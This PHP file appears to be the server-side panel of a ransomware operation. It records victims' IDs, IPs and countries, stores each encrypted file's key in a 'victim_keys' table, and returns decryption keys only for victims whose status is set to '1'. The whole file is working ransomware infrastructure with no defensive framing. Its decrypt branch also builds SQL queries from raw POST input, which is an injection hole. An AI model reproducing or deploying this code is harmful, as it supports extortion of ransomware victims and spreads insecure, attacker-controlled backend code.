<?php
error_reporting(0);
include "system/config.php";
include "system/class_notice.php";
include "system/class_pagination.php";
include "system/function.php";

if(isset($_POST['id']) &&
  (isset($_POST['info'])) && 
  (isset($_POST['ip'])) && 
  (isset($_POST['country'])) &&
  (isset($_POST['date']))){

		$sql = $db->go("INSERT INTO victims    (id, 
												vid,
												ip, 
												country, 
												info,
												date,
												status
												)
										VALUES (NULL, 
												'{$db->q($_POST['id'])}', 
												'{$db->q($_POST['ip'])}', 
												'{$db->q($_POST['country'])}', 
												'{$db->q($_POST['info'])}',
												'".date("Y-m-d H:i:s")."',
												'0'
												)
						");

} elseif(isset($_POST['file']) &&
  (isset($_POST['encfile'])) && 
  (isset($_POST['key'])) && 
  (isset($_POST['id']))){

		$sql = $db->go("INSERT INTO victim_keys (id, 
												vid,
												original_file, 
												encrypted_file, 
												encrypted_key,
												date
												)
										VALUES (NULL, 
												'{$db->q($_POST['id'])}', 
												'{$db->q($_POST['file'])}', 
												'{$db->q($_POST['encfile'])}', 
												'{$db->q($_POST['key'])}', 
												'".date("Y-m-d H:i:s")."'
												)
						");

} elseif (!empty($_POST['file']) && !empty($_POST['id']) && $_POST['act'] == 'decrypt') {
	$db->go("SELECT * FROM victims WHERE vid = '".$_POST['id']."' ORDER BY id DESC");
	while($row = $db->fetchArray()){
		if($row['status'] == "1") {
			$db->go("SELECT * FROM victim_keys WHERE vid = '".$row['vid']."' AND encrypted_file = '".$_POST['file']."' ORDER BY id DESC");
			while($data = $db->fetchArray()){
				echo '
{
	"dec_file":"'.$data['original_file'].'",
	"dec_key":"'.$data['encrypted_key'].'"
}';
			}
		}
	}
}
